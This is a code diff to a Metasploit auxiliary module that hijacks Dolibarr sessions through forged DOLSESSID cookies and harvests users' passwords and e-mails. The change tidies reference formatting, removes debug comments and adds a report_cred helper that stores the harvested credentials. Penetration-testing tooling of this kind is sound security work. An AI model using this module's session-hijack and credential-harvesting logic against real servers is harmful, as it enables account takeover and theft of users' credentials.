@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -26,8 +26,8 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         => 'Brendan Coles <bcoles[at]gmail.com>',
       'References'     =>
         [
-          ['URL'       => 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
-          ['URL'       => 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
+          ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
+          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
         ],
       'DisclosureDate' => 'Jan 12 2014'))
     register_options(
@@ -101,7 +101,6 @@ class Metasploit3 < Msf::Auxiliary
   # Verify if session cookie is valid and return user's ID
   #
   def get_user_id
-    # print_debug("#{peer} - Trying to hijack session '#{@cookie}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => @cookie
@@ -121,7 +120,6 @@ class Metasploit3 < Msf::Auxiliary
   # Construct cookie using token
   #
   def create_cookie(token)
-    # print_debug("#{peer} - Creating a cookie with token '#{token}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
@@ -153,6 +151,32 @@ class Metasploit3 < Msf::Auxiliary
     get_session_tokens ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     return unless tokens = get_session_tokens
     credentials = []
@@ -174,14 +198,14 @@ class Metasploit3 < Msf::Auxiliary
       'Columns' => ['Username', 'Password', 'Admin', 'E-mail']
     )
     credentials.each do |record|
-      report_auth_info({
-        :host  => rhost,
-        :port  => rport,
-        :sname => (ssl ? 'https' : 'http'),
-        :user  => record[0],
-        :pass  => record[1],
-        :source_type => 'vuln'
-      })
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: (ssl ? 'https' : 'http'),
+        user: record[0],
+        password: record[1],
+        proof: @cookie
+      )
       cred_table << [record[0], record[1], record[2], record[3]]
     end
     print_line
